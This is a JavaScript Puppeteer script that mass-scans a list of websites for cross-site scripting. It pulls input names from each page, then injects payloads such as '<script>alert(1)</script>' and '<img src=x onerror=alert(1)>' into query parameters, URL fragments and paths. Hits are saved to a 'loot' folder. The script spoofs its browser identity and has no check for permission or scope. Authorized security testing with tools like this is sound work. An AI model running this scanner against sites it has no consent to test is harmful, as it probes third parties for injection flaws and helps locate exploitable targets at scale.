const puppeteer = require('puppeteer-core');
const fs = require('fs');
const path = require('path');

const payloads = [
    'javascript:alert(1)',
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"`><script>alert(1)</script>',
    '${alert(1)}',
    '{{constructor.constructor(\'alert(1)\')()}}'
];

const reportDir = path.join(__dirname, 'loot');
if (!fs.existsSync(reportDir)) {
    fs.mkdirSync(reportDir);
}

const args = process.argv.slice(2);
if (args.length === 0) {
    console.log("❌ Error: Missing targets.");
    process.exit(1);
}

const inputTarget = args[0];
let targetList = [];

if (fs.existsSync(inputTarget)) {
    targetList = fs.readFileSync(inputTarget, 'utf-8')
        .split('\n')
        .map(line => line.trim())
        .filter(line => line.startsWith('http://') || line.startsWith('https://'));
} else if (inputTarget.startsWith('http://') || inputTarget.startsWith('https://')) {
    targetList.push(inputTarget);
} else {
    console.log("❌ Error: Input must be a valid HTTP/HTTPS URL or file.");
    process.exit(1);
}

function logVulnerability(issue) {
    const filename = path.join(reportDir, 'findings.json');
    let existingData = [];
    if (fs.existsSync(filename)) {
        try { existingData = JSON.parse(fs.readFileSync(filename, 'utf-8')); } catch (e) {}
    }
    existingData.push({ timestamp: new Date().toISOString(), ...issue });
    fs.writeFileSync(filename, JSON.stringify(existingData, null, 4), 'utf-8');
}

async function runMassScanner() {
    console.log(`[+] Initializing Chromium Browser via Puppeteer...`);
    const browser = await puppeteer.launch({ 
        executablePath: '/usr/bin/chromium-browser',
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-blink-features=AutomationControlled']
    });

    for (let baseUrl of targetList) {
        console.log(`\n==================================================================`);
        console.log(`🎯 CURRENT SCOPE TARGET: ${baseUrl}`);
        console.log(`==================================================================`);

        const page = await browser.newPage();
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
        const discoveredParams = new Set(['search', 'q', 'id']); 

        console.log(`[🔍 Phase 1]: Discovering input parameters...`);
        try {
            await page.goto(baseUrl, { waitUntil: 'domcontentloaded', timeout: 20000 });
            const extractedParams = await page.evaluate(() => {
                const keys = [];
                document.querySelectorAll('input, textarea, select, form').forEach(el => {
                    if (el.name) keys.push(el.name);
                });
                return keys;
            });
            extractedParams.forEach(param => discoveredParams.add(param));
        } catch (err) {
            console.log(`[-] Discovery process failed or timed out.`);
        } finally {
            await page.close();
        }

        console.log(`[🚀] Launching Attack Matrix Execution...`);
        for (let payload of payloads) {
            const testUrls = [];
            discoveredParams.forEach(param => {
                testUrls.push({ url: `${baseUrl}?${param}=${encodeURIComponent(payload)}`, type: `QUERY (${param})` });
            });
            testUrls.push({ url: `${baseUrl.replace(/\/$/, '')}#${encodeURIComponent(payload)}`, type: 'HASH (#)' });
            testUrls.push({ url: `${baseUrl.replace(/\/$/, '')}/${encodeURIComponent(payload)}`, type: 'PATH-ROUTER' });

            for (let target of testUrls) {
                const attackPage = await browser.newPage();
                await attackPage.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
                let xssDetected = false;

                attackPage.on('dialog', async dialog => {
                    if (dialog.message() || dialog.type() === 'alert') {
                        console.log(`\n🚨🚨🚨 [XSS DETECTED!] -> ${target.url}`);
                        logVulnerability({ target_scope: baseUrl, exploit_url: target.url, payload: payload });
                        xssDetected = true;
                        await dialog.dismiss();
                    }
                });

                try {
                    console.log(`[*] Testing Vector [${target.type}]: ${target.url}`);
                    await attackPage.goto(target.url, { waitUntil: 'domcontentloaded', timeout: 25000 });
                    await new Promise(resolve => setTimeout(resolve, 2000));
                } catch (error) {
                    console.log(`[-] Execution timeout on target vector.`);
                } finally {
                    await attackPage.close();
                }
            }
        }
    }
    await browser.close();
    console.log(`\n[+] Dynamic Master Scan Campaign Finished.`);
}

runMassScanner();
